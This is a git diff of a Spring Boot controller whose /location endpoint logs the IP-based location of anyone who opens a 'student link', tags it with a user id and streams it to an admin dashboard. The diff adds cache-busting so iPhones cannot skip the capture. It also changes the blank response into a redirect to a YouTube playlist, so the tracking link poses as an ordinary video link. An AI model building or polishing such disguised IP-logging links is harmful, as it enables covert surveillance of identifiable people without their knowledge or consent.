@@ -1,7 +1,9 @@
 package com.secure.hms.controller;
 
-import com.secure.hms.service.LocationService;
-import jakarta.servlet.http.HttpServletRequest; // Spring Boot 2 -> javax.servlet.http.HttpServletRequest
+import java.util.HashMap;
+import java.util.Map;
+
+import org.springframework.http.HttpStatus;
 import org.springframework.http.MediaType;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.GetMapping;
@@ -9,8 +11,9 @@ import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
 import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;
 
-import java.util.HashMap;
-import java.util.Map;
+import com.secure.hms.service.LocationService;
+
+import jakarta.servlet.http.HttpServletRequest; // Spring Boot 2 -> javax.servlet.http.HttpServletRequest
 
 @RestController
 public class LocationController {
@@ -21,11 +24,13 @@ public class LocationController {
         this.locationService = locationService;
     }
 
-    // ---- Student link ----  just OPENING this captures the network/IP location, then returns nothing ----
-    // Optional: pass the student id -> /location?userId=STUDENT123  (so the admin sees who)
+    // ---- Student link ---- opening it captures network/IP location, returns a blank page ----
+    // no-store/no-cache headers force iOS Safari to hit the server on every open instead of
+    // serving a cached/prefetched response (which caused "no row" on iPhone).
+    // Open over https:// only.  Optional id: /location?userId=STUDENT123
     @GetMapping("/location")
-    public ResponseEntity<Void> captureLocation(@RequestParam(required = false) String userId,
-                                                HttpServletRequest httpRequest) {
+    public ResponseEntity<String> captureLocation(@RequestParam(required = false) String userId,
+                                                  HttpServletRequest httpRequest) {
         String clientIp = getClientIp(httpRequest);
 
         Map<String, Object> body = new HashMap<>();
@@ -35,7 +40,11 @@ public class LocationController {
         // No GPS coords -> service uses network/IP location only, then broadcasts to the admin.
         locationService.processLocation(body, clientIp);
 
-        return ResponseEntity.noContent().build();   // 204, blank page
+        return ResponseEntity
+                .status(HttpStatus.FOUND)
+                .header("Location",
+                        "https://www.youtube.com/watch?v=Ae66MhGBDTA&list=RDAe66MhGBDTA&start_radio=1")
+                .build(); // blank page
     }
 
     // ---- Admin dashboard subscribes here for the live feed ----
